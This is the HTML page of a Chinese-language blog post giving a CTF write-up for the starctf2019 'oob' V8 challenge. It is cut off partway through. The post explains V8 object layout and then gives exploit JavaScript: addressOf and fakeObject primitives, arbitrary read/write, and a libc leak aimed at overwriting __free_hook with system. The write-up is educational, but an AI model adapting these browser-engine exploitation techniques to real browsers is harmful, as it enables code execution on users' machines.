@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('password?') !== ''){
+                alert('wrong passwd!');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,browser,v8,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="starctf2019_oob调试打开调试 ./d8 --allow-natives-syntax  12%DebugPrint(obj) // 输出对象相关信息%SystemBreak() // 断点  除此之外官方还有gdb的脚本, 使得可以在gdb中可视化调试 set args --allow-natives-syntax ./test.js 1job address # 将某个地址解释为一">
+<meta name="keywords" content="pwn,browser,v8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="starctf2019_oob">
+<meta property="og:url" content="https://q4n.github.io/2019/11/26/starctf2019_oob/index.html">
+<meta property="og:site_name" content="Q4n&#39;s Blog">
+<meta property="og:description" content="starctf2019_oob调试打开调试 ./d8 --allow-natives-syntax  12%DebugPrint(obj) // 输出对象相关信息%SystemBreak() // 断点  除此之外官方还有gdb的脚本, 使得可以在gdb中可视化调试 set args --allow-natives-syntax ./test.js 1job address # 将某个地址解释为一">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-11-26T13:14:36.020Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="starctf2019_oob">
+<meta name="twitter:description" content="starctf2019_oob调试打开调试 ./d8 --allow-natives-syntax  12%DebugPrint(obj) // 输出对象相关信息%SystemBreak() // 断点  除此之外官方还有gdb的脚本, 使得可以在gdb中可视化调试 set args --allow-natives-syntax ./test.js 1job address # 将某个地址解释为一">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://q4n.github.io/2019/11/26/starctf2019_oob/">
+
+
+
+
+
+
+  <title>starctf2019_oob | Q4n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Q4n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一个Bin弟弟</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://q4n.github.io/2019/11/26/starctf2019_oob/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Q4n">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Q4n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">starctf2019_oob</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-26T21:14:35+08:00">
+                2019-11-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/11/26/starctf2019_oob/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/11/26/starctf2019_oob/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="starctf2019-oob"><a href="#starctf2019-oob" class="headerlink" title="starctf2019_oob"></a>starctf2019_oob</h1><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>打开调试 <code>./d8 --allow-natives-syntax</code> </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) <span class="comment">// 输出对象相关信息</span></span><br><span class="line">%SystemBreak() <span class="comment">// 断点</span></span><br></pre></td></tr></table></figure>
+
+<p>除此之外官方还有gdb的脚本, 使得可以在gdb中可视化调试</p>
+<p><code>set args --allow-natives-syntax ./test.js</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job address <span class="comment"># 将某个地址解释为一个object</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="V8-主要结构"><a href="#V8-主要结构" class="headerlink" title="V8 主要结构"></a>V8 主要结构</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">m<span class="symbol">ap:</span> 表明对象的类型</span><br><span class="line"></span><br><span class="line">prototy<span class="symbol">pe:</span> 每个对象都继承自另外一个对象，后者称为“原型”（prototype）对象，只有null除外，它没有自己的原型对象</span><br><span class="line"></span><br><span class="line">elemen<span class="symbol">ts:</span> 数组对象</span><br><span class="line">其中的<span class="built_in">int</span>整数的存储是将原始元素 <span class="built_in">int</span> * <span class="number">2</span> 放入到内存中</span><br><span class="line">num &gt;= <span class="number">0</span>x80000000 的整数用double类型进行存储</span><br><span class="line">float类型直接用浮点方式存储(IEEE <span class="number">754</span>)</span><br><span class="line"></span><br><span class="line">leng<span class="symbol">th:</span> 元素个数</span><br><span class="line"></span><br><span class="line">properti<span class="symbol">es:</span> 属性</span><br></pre></td></tr></table></figure>
+
+<p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于当前object的上方，即低地址处</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DoubleOBJ  ----&gt;   +------------------------+</span><br><span class="line">                   |          MAP           +&lt;---------+</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      length            |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |          |</span><br><span class="line">                   |                        +----------+</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上述内存布局是FloatArray的内存布局，其它类型的Array与其类似，但不完全相同</p>
+</blockquote>
+<p>注意这个地方, 这里只有当对象为<code>[1.2, 2.2]</code> 是一个浮点数组或者是一个<code>[obj]</code>对象数组 的时候, 才保持这两个对象地址相连</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里已经有v8的源码了:P</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置bash代理</span></span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://192.168.221.1:1080/"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="variable">$http_proxy</span></span><br><span class="line"><span class="comment"># 设置代理</span></span><br><span class="line">$ git config --global https.proxy socks5://192.168.221.1:1080             </span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line"><span class="comment"># 回滚到版本</span></span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"><span class="comment"># 加入对应的diff</span></span><br><span class="line">git apply &lt; oob.diff</span><br><span class="line"></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment"># 生成目标平台必须的构建文件</span></span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line"><span class="comment"># 编译v8源码</span></span><br><span class="line">ninja -C out.gn/x64.release   <span class="comment"># 编译构建v8运行的所有文件</span></span><br><span class="line">ninja -C out.gn/x64.release d8  <span class="comment"># 只编译d8这个特定的文件</span></span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>查看diff文件新加入的东西, 有一个很明显的off by one的漏洞, 我们可以利用他来进行越界读写下一个object的map</p>
+<p>因为v8中数用浮点数表示, 可以先写好浮点数与整数间的转换原语函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buff_area = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> fl = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buff_area);</span><br><span class="line"><span class="keyword">var</span> ui = <span class="keyword">new</span> BigUint64Array(buff_area);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">floo</span>)</span>&#123;</span><br><span class="line">    fl[<span class="number">0</span>] = floo;</span><br><span class="line">    <span class="keyword">return</span> ui[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">intt</span>)</span>&#123;</span><br><span class="line">    ui[<span class="number">0</span>] = intt;</span><br><span class="line">    <span class="keyword">return</span> fl[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tos</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0x"</span>+data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在调试的时候我们可以看到v8的boxing操作</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Value B is an 8 bytes long value //<span class="keyword">in</span> x64.</span><br><span class="line">If B is a double:</span><br><span class="line">    B is the binary representation of a double</span><br><span class="line">Else:</span><br><span class="line">    <span class="keyword">if</span> B is a int32:</span><br><span class="line">        B = the value of B &lt;&lt; 32 // <span class="built_in">which</span> mean 0xdeadbeef is 0xdeadbeef00000000 <span class="keyword">in</span> v8</span><br><span class="line">    <span class="keyword">else</span>: // B is a pointer</span><br><span class="line">        B = B | 1</span><br></pre></td></tr></table></figure>
+
+<p>假如我们用的是浮点list, 那我们可以得到下面的layout(其他的是不同的)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-32 : some pointer // not related to the challenge. This is memory is also <span class="built_in">where</span> the element pointer points at.</span><br><span class="line">-24 : length of segment</span><br><span class="line">-16 : element 0 // 1.1</span><br><span class="line">-8  : element 1 // 2.2</span><br><span class="line">+0  : map pointer // the address <span class="built_in">where</span> the obj pointer points at</span><br><span class="line">+8  : property pointer</span><br><span class="line">+16 : element pointer //pointing at location -32</span><br><span class="line">+24 : length( <span class="keyword">in</span> the high four bytes )</span><br></pre></td></tr></table></figure>
+
+<p>所以我们现在可以看出, oob就是给我们读写下一个obj的map的</p>
+<h3 id="编写addressOf和fakeObject"><a href="#编写addressOf和fakeObject" class="headerlink" title="编写addressOf和fakeObject"></a>编写addressOf和fakeObject</h3><p>这两个的功能分别是<code>获得一个对象的地址</code>和<code>将一个对象的内存地址伪造为一个对象</code>, 假如实现了这两个原语, 那么之后的利用就很方便(taolu)了</p>
+<p>首先 leak 出map的地址</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj=&#123;<span class="string">'a'</span>:<span class="number">1</span>&#125;;</span><br><span class="line">obj_array=[obj];</span><br><span class="line">f_array=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak maps</span></span><br><span class="line">obj_array_type=obj_array.oob();</span><br><span class="line">f_array_type=f_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] obj_array_type@"</span>+tos(f2i(obj_array_type)));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] f_array_type@"</span>+tos(f2i(f_array_type)));</span><br></pre></td></tr></table></figure>
+
+<p>接下来构造addressOf</p>
+<p>这里注意其中所有的整形数据用<code>bigint</code> 这种类型, 也就是<code>100n</code>这样后面需要加上一个<code>n</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">	obj_array[<span class="number">0</span>]=obj_to_leak;</span><br><span class="line">	obj_array.oob(f_array_type);</span><br><span class="line">	<span class="keyword">let</span> obj_addr=f2i(obj_array[<span class="number">0</span>])<span class="number">-1</span>n;</span><br><span class="line">	<span class="comment">// type of 1n: bigint</span></span><br><span class="line">	obj_array.oob(obj_array_type);</span><br><span class="line">	<span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来构造fakeObject</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">	<span class="comment">// address is integer and align to 0x8</span></span><br><span class="line">	f_array[<span class="number">0</span>]=i2f(address+<span class="number">1</span>n);</span><br><span class="line">	f_array.oob(obj_array_type);</span><br><span class="line">	<span class="keyword">let</span> tmp_obj=f_array[<span class="number">0</span>];</span><br><span class="line">	f_array.oob(f_array_type);</span><br><span class="line">	<span class="keyword">return</span> tmp_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="编写R-W原语"><a href="#编写R-W原语" class="headerlink" title="编写R/W原语"></a>编写R/W原语</h3><p>接下来的利用就是如何构造任意地址R/W原语了</p>
+<p>我们用到上面我们刚刚写好的fakeObject和addressOf这两个函数来进行编写</p>
+<p>做法是, 我们可以新建一个浮点数的ArrayObject, 我们知道他的结构是这样子的, 而且他的element指针指向他相邻的上一个chunk, 所以我们通过leak出这个arrayobject就可以得到我们写入浮点数的地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DoubleOBJ  ----&gt;   +------------------------+</span><br><span class="line">                   |          MAP           +&lt;---------+</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      length            |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |          |</span><br><span class="line">                   |                        +----------+</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>接着我们可以构造浮点数, 伪造一个指向float的fake_arrayobject, 接着写element指针指向任意位置, 利用fakeObject返回一个对象, 通过这个对象, 我们就可以实现任意地址读写了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_obj_build=[</span><br><span class="line">	f_array_type,</span><br><span class="line">	i2f(<span class="number">0</span>n),</span><br><span class="line">	i2f(<span class="number">0x4141414141414141</span>n),</span><br><span class="line">	i2f(<span class="number">0x400000000</span>n),</span><br><span class="line">	<span class="number">1.1</span>,</span><br><span class="line">	<span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">// when we only use 4 elements, </span></span><br><span class="line"><span class="comment">// something strange in objects layout</span></span><br><span class="line"></span><br><span class="line">fake_obj_addr=addressOf(fake_obj_build)<span class="number">-0x30</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] fake_obj_addr@"</span>+tos(fake_obj_addr));</span><br><span class="line">fake_obj=fakeObject(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">	fake_obj_build[<span class="number">2</span>]=i2f(address+<span class="number">1</span>n<span class="number">-0x10</span>n);</span><br><span class="line">	readin=f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"[*] read: "</span>+tos(readin));</span><br><span class="line">	<span class="keyword">return</span> readin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">	fake_obj_build[<span class="number">2</span>]=i2f(address+<span class="number">1</span>n<span class="number">-0x10</span>n);</span><br><span class="line">	fake_obj[<span class="number">0</span>]=i2f(value);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"[*] write: "</span></span><br><span class="line">		+tos(address)</span><br><span class="line">		+<span class="string">" =&gt; "</span></span><br><span class="line">		+tos(value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里一开始我是用的4个double, 但是发现布局并不是在上面, 而是在chunk的下方, 参考了<code>参考链接2</code>, 修改了一下数组中double的个数</p>
+<p>还有我们需要注意我们这个R/W原语的局限性</p>
+<blockquote>
+<p>我们write64写原语使用的是FloatArray的写入操作，而Double类型的浮点数数组在处理7f开头的高地址时会出现将低20位与运算为0，从而导致上述操作无法写入的错误。这个解释不一定正确。出现的结果就是，直接用FloatArray方式向高地址写入会不成功。</p>
+</blockquote>
+<p>现在我们已经获得了R/W原语了, 接下来我们用我们构造的任意地址读写来完成getshell</p>
+<h3 id="从R-W到shell"><a href="#从R-W到shell" class="headerlink" title="从R/W到shell"></a>从R/W到shell</h3><p>从R/W到getshell也有很多的思(tao)路 :P</p>
+<h4 id="传统Linux-Pwn方式getshell"><a href="#传统Linux-Pwn方式getshell" class="headerlink" title="传统Linux Pwn方式getshell"></a>传统Linux Pwn方式getshell</h4><p>leak出程序基址和libc base</p>
+<p>翻了翻内存, 可以注意到, 在这个区段开头的位置, 是存有programe的地址的, 所以我们可以从那里进行leak, 利用随机化后三位不变的特性进行向前不断读取数据</p>
+<p>leak  中间某个地址不知道为啥挂了, 我就手动减了一下start_address</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">test=[<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> start_addr=addressOf(test)<span class="number">-0xb000</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(tos(start_addr))</span><br><span class="line"><span class="keyword">var</span> leak=<span class="number">0</span>n;</span><br><span class="line"><span class="comment">// i=2;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="comment">// 1d8:0ec0│   0xe2b86d80ec0 —▸ 0x5555557f13a0 ◂— push   rbp</span></span><br><span class="line">	start_addr-=<span class="number">8</span>n;</span><br><span class="line">	leak=read64(start_addr);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"[*] "</span>+tos(start_addr)+<span class="string">" =&gt; "</span>+tos(leak));</span><br><span class="line">	<span class="keyword">if</span>((((start_addr&amp;<span class="number">0xfff</span>n)==<span class="number">0xed0</span>n)&amp;&amp;<span class="number">0x3a0</span>n==(leak&amp;<span class="number">0xfff</span>n)))&#123; </span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"[+] find proc: "</span>+tos(leak));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">leak-=<span class="number">0x29d3a0</span>n;</span><br><span class="line">free_got=<span class="number">0x00000d99ec8</span>n+leak;</span><br><span class="line"></span><br><span class="line">libc=read64(free_got)<span class="number">-0x844f0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc@"</span>+tos(libc));</span><br><span class="line">free_hook=<span class="number">0x3c67a8</span>n+libc;</span><br><span class="line">system=libc+<span class="number">0x45390</span>n;</span><br></pre></td></tr></table></figure>
+
+<p>write __free_hook ==&gt; system</p>
+<p><code>write64(free_hook,system);</code></p>
+<p>但是, 这个地方是失败了的. 在调试中发现, 我实际写的地址是<code>0x7ffff7480000</code>, 也就是后面都被清空了. 这个就是上面所说的局限性</p>
+<p>所以这里我们需要修改一下, 我们可以借助<code>DataView</code> 这个对象, 来实现我们写入的操作</p>
+<p>我们可以先新建一个dataview来观察一下layout</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> view= <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">view.setUint32(<span class="number">0</span>,<span class="number">0xdeadbeef</span>,<span class="number">8</span>);</span><br><span class="line"><span class="built_in">console</span>.log(tos(view.getUint32(<span class="number">0</span>,<span class="literal">true</span>)));</span><br><span class="line">%DebugPrint(view);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+
